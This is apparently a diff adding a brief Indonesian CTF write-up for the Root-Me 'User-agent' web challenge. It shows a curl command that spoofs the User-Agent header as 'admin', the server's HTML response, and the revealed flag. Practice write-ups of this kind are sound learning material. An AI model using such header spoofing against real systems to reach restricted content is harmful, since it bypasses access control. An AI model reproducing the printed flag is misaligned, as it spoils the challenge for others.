@@ -1,0 +1,19 @@
+Soal : http://challenge01.root-me.org/web-serveur/ch2/
+	
+	Challenge's Name : User-agent
+	Hint : Admin is really dumb..
+	
+	Solusi : curl -A "admin" http://challenge01.root-me.org/web-serveur/ch2/
+	
+	Result : 
+	<html>
+		<body>
+		<link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
+		<iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe
+		><h3>Welcome master !<br/>Password : rr$Li9%L34qd1AAe27</h3>
+		</body>
+	</html>
+
+	Atau menggunakan User Agent Switcher
+	
+	Flag : rr$Li9%L34qd1AAe27
